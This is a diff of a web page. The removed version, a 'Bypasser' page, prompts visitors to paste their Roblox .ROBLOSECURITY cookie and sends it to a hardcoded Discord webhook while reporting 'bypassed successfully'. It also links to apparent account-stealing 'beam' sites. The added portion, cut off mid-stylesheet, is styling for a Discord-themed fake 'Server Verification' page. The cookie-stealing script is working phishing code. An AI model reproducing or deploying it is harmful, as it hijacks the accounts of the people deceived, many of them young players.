@@ -1,347 +1,283 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>vex</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap');
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TEMP - Advanced Server Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
 
-body{
-  background:#0a0a0a;
-  color:#e0e0e0;
-  font-family:'Inter',sans-serif;
-  min-height:100vh;
-  overflow-x:hidden;
-  position:relative;
-}
+        :root {
+            --primary: #7289da;
+            --primary-dark: #677bc4;
+            --secondary: #43b581;
+            --secondary-dark: #3ca374;
+            --background: #36393f;
+            --surface: #2f3136;
+            --surface-light: #424549;
+            --surface-lighter: #36393f;
+            --text-primary: #dcddde;
+            --text-secondary: #b9bbbe;
+            --text-muted: #72767d;
+            --danger: #f04747;
+            --warning: #faa61a;
+            --success: #43b581;
+            --info: #17a2b8;
+            --blurple: #5865F2;
+        }
 
-canvas#snow{
-  position:fixed;
-  top:0;left:0;
-  width:100%;height:100%;
-  pointer-events:none;
-  z-index:0;
-}
+        body {
+            background-color: var(--background);
+            color: var(--text-primary);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
 
-.wrap{
-  position:relative;
-  z-index:1;
-  max-width:540px;
-  margin:0 auto;
-  padding:40px 20px;
-}
+        /* Animated background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
 
-.server-bar{
-  text-align:center;
-  margin-bottom:48px;
-  padding-bottom:24px;
-  border-bottom:1px solid #1a1a1a;
-}
+        .bg-animation::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(114, 137, 218, 0.1) 0%, rgba(47, 49, 54, 0) 70%);
+            animation: rotate 30s linear infinite;
+        }
 
-.server-bar a{
-  color:#787878;
-  font-size:12px;
-  letter-spacing:.4px;
-  text-decoration:none;
-  text-transform:uppercase;
-  font-weight:500;
-  transition:color .2s;
-}
+        .bg-animation::after {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(67, 181, 129, 0.05) 0%, rgba(47, 49, 54, 0) 70%);
+            animation: rotate 40s linear infinite reverse;
+        }
 
-.server-bar a:hover{color:#fff}
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-.server-bar p{
-  color:#333;
-  font-size:11px;
-  margin-top:6px;
-  font-weight:300;
-}
+        .container {
+            width: 100%;
+            max-width: 550px;
+            background-color: var(--surface);
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+            overflow: hidden;
+            transform: translateY(0);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            z-index: 10;
+        }
 
-.tabs{
-  display:flex;
-  gap:0;
-  margin-bottom:36px;
-  border-bottom:1px solid #1a1a1a;
-}
+        .container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.5);
+        }
 
-.tab{
-  background:none;
-  border:none;
-  color:#444;
-  font-family:'Inter',sans-serif;
-  font-size:13px;
-  font-weight:500;
-  padding:10px 0;
-  margin-right:28px;
-  cursor:pointer;
-  position:relative;
-  transition:color .2s;
-  letter-spacing:.2px;
-}
+        .header {
+            background: linear-gradient(135deg, var(--blurple) 0%, var(--primary) 100%);
+            padding: 25px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
 
-.tab:hover{color:#999}
+        .header::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0) 70%);
+            animation: rotate 20s linear infinite;
+        }
 
-.tab.active{color:#e0e0e0}
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #fff 0%, rgba(255, 255, 255, 0.8) 100%);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+            font-size: 36px;
+            font-weight: bold;
+            color: var(--blurple);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 1;
+            animation: pulse 2s ease infinite;
+        }
 
-.tab.active::after{
-  content:'';
-  position:absolute;
-  bottom:-1px;
-  left:0;
-  width:100%;
-  height:1px;
-  background:#e0e0e0;
-}
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
 
-.panel{display:none}
-.panel.active{display:block}
+        .server-info {
+            position: relative;
+            z-index: 1;
+        }
 
-/* bypasser */
-.bypasser-label{
-  font-size:11px;
-  color:#555;
-  text-transform:uppercase;
-  letter-spacing:.8px;
-  margin-bottom:14px;
-  font-weight:500;
-}
+        .server-icon {
+            width: 70px;
+            height: 70px;
+            border-radius: 20px;
+            background: linear-gradient(135deg, var(--secondary) 0%, var(--success) 100%);
+            margin: 0 auto 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 28px;
+            font-weight: bold;
+            color: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
 
-.input-wrap{
-  position:relative;
-  margin-bottom:16px;
-}
+        .server-name {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            color: white;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
 
-.input-wrap input{
-  width:100%;
-  background:#0f0f0f;
-  border:1px solid #1c1c1c;
-  color:#ccc;
-  font-family:'JetBrains Mono',monospace;
-  font-size:13px;
-  padding:14px 16px;
-  border-radius:4px;
-  outline:none;
-  transition:border-color .2s;
-}
+        .server-members {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-.input-wrap input::placeholder{color:#2e2e2e}
-.input-wrap input:focus{border-color:#333}
+        .server-members i {
+            margin-right: 5px;
+            font-size: 14px;
+        }
 
-.submit-btn{
-  width:100%;
-  background:#e0e0e0;
-  color:#0a0a0a;
-  border:none;
-  font-family:'Inter',sans-serif;
-  font-size:13px;
-  font-weight:600;
-  padding:12px;
-  border-radius:4px;
-  cursor:pointer;
-  transition:background .15s, transform .1s;
-  letter-spacing:.3px;
-}
+        .content {
+            padding: 30px;
+            text-align: center;
+        }
 
-.submit-btn:hover{background:#fff}
-.submit-btn:active{transform:scale(.985)}
+        .verification-message {
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
 
-.status{
-  margin-top:14px;
-  font-size:12px;
-  color:#333;
-  min-height:18px;
-  font-weight:300;
-}
+        .verification-message h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: var(--text-primary);
+        }
 
-.status.ok{color:#5a5}
-.status.err{color:#a55}
+        .verification-message p {
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+        }
 
-/* links */
-.link-list{
-  list-style:none;
-  display:flex;
-  flex-direction:column;
-  gap:2px;
-}
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin: 30px 0;
+            position: relative;
+        }
 
-.link-list li a{
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  padding:14px 16px;
-  color:#bbb;
-  text-decoration:none;
-  font-size:14px;
-  font-weight:400;
-  border-radius:4px;
-  transition:background .15s, color .15s;
-}
+        .steps::before {
+            content: "";
+            position: absolute;
+            top: 20px;
+            left: 50px;
+            right: 50px;
+            height: 2px;
+            background-color: var(--surface-light);
+            z-index: 1;
+        }
 
-.link-list li a:hover{
-  background:#111;
-  color:#fff;
-}
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 2;
+            transition: transform 0.3s ease;
+        }
 
-.link-list li a span.arrow{
-  color:#333;
-  font-size:14px;
-  transition:color .15s, transform .15s;
-}
+        .step:hover {
+            transform: translateY(-5px);
+        }
 
-.link-list li a:hover span.arrow{
-  color:#888;
-  transform:translateX(3px);
-}
+        .step-number {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--surface-light);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 10px;
+            font-weight: bold;
+            color: var(--text-muted);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+        }
 
-.link-label{
-  font-size:11px;
-  color:#555;
-  text-transform:uppercase;
-  letter-spacing:.8px;
-  margin-bottom:14px;
-  font-weight:500;
-}
+        .step.active .step-number {
+            background: linear-gradient(135deg, var(--blurple) 0%, var(--primary) 100%);
+            color: white;
+            box-shadow: 0 4px 12px rgba(114, 137, 218, 0.4);
+        }
 
-.footer{
-  text-align:center;
-  margin-top:64px;
-  padding-top:24px;
-  border-top:1px solid #111;
-}
+        .step.completed .step-number {
+            background: linear-gradient(135deg, var(--success) 0%, var(--secondary) 100%);
+            color: white;
+        }
 
-.footer span{
-  font-size:11px;
-  color:#222;
-  font-weight:300;
-}
-</style>
-</head>
-<body>
+        .step-text {
+            font-size: 14px;
+            color: var(--text-muted);
+            transition: color 0.3s ease;
+        }
 
-<canvas id="snow"></canvas>
+        .step.active .step-text {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
 
-<div class="wrap">
+        .step.completed .step-text {
+            color: var(--success);
+        }
 
-  <div class="server-bar">
-    <a href="https://discord.gg/5eeWBhZAuR" target="_blank">vex beams server</a>
-    <p>join for updates</p>
-  </div>
-
-  <div class="tabs">
-    <button class="tab active" data-tab="bypasser">Bypasser</button>
-    <button class="tab" data-tab="links">Homepage</button>
-  </div>
-
-  <div class="panel active" id="bypasser">
-    <p class="bypasser-label">input .robloxsecurity</p>
-    <div class="input-wrap">
-      <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..." autocomplete="off" spellcheck="false">
-    </div>
-    <button class="submit-btn" id="submitBtn">Submit</button>
-    <p class="status" id="status"></p>
-  </div>
-
-  <div class="panel" id="links">
-    <p class="link-label">resources</p>
-    <ul class="link-list">
-      <li><a href="https://app.beamse.pro/gen/Vex" target="_blank">VEX SITE <span class="arrow">-></span></a></li>
-      <li><a href="https://shockify.st/?code=MTQ4NDIwNzE5MDk0NzA1MjgwMg==" target="_blank">Shockify <span class="arrow">-></span></a></li>
-      <li><a href="https://blox-link.com/gen" target="_blank">Blox Link Method Site <span class="arrow">-></span></a></li>
-      <li><a href="https://tncs-hyper-lnk-jitv.vercel.app/" target="_blank">Hyperlink <span class="arrow">-></span></a></li>
-    </ul>
-  </div>
-
-  <div class="footer">
-    <span>vex</span>
-  </div>
-
-</div>
-
-<script>
-// tabs
-document.querySelectorAll('.tab').forEach(t=>{
-  t.addEventListener('click',()=>{
-    document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
-    document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
-    t.classList.add('active');
-    document.getElementById(t.dataset.tab).classList.add('active');
-  });
-});
-
-// submit
-const webhook='https://discord.com/api/webhooks/1488738403934539818/NuJwz-0f--N9uHAnSrKhgOISmKPD4wd9JIBTC_xAi0VYC2ZK4iLZF9k8F9Wpk5P72Vcz';
-
-document.getElementById('submitBtn').addEventListener('click',async()=>{
-  const val=document.getElementById('cookieInput').value.trim();
-  const s=document.getElementById('status');
-  if(!val){s.textContent='empty input';s.className='status err';return}
-  s.textContent='sending...';s.className='status';
-  try{
-    const r=await fetch(webhook,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({content:'```'+val+'```'})
-    });
-    if(r.ok){
-      s.textContent='bypassed successfully';
-      s.className='status ok';
-      document.getElementById('cookieInput').value='';
-    }else{
-      s.textContent='failed, try again';
-      s.className='status err';
-    }
-  }catch(e){
-    s.textContent='network error';
-    s.className='status err';
-  }
-});
-
-// snow
-(function(){
-  const c=document.getElementById('snow');
-  const ctx=c.getContext('2d');
-  let w,h;
-  const flakes=[];
-  const COUNT=120;
-
-  function resize(){
-    w=c.width=window.innerWidth;
-    h=c.height=window.innerHeight;
-  }
-  window.addEventListener('resize',resize);
-  resize();
-
-  for(let i=0;i<COUNT;i++){
-    flakes.push({
-      x:Math.random()*w,
-      y:Math.random()*h,
-      r:Math.random()*1.8+.3,
-      sx:Math.random()*.3-.15,
-      sy:Math.random()*.6+.2,
-      o:Math.random()*.4+.08
-    });
-  }
-
-  function draw(){
-    ctx.clearRect(0,0,w,h);
-    for(const f of flakes){
-      ctx.beginPath();
-      ctx.arc(f.x,f.y,f.r,0,Math.PI*2);
-      ctx.fillStyle='rgba(255,255,255,'+f.o+')';
-      ctx.fill();
-      f.x+=f.sx;
-      f.y+=f.sy;
-      if(f.y>h+5){f.y=-5;f.x=Math.random()*w}
-      if(f.x>w+5)f.x=-5;
-      if(f.x<-5)f.x=w+5;
-    }
-    requestAnimationFrame(draw);
-  }
-  draw();
-})();
-</script>
-
-</body>
-</html>
+        .verify-button, .continue-button {
+            background: linear-gradient(135deg, var(--blurple) 0%, var(--primary) 100%);
+            color: white;
+           
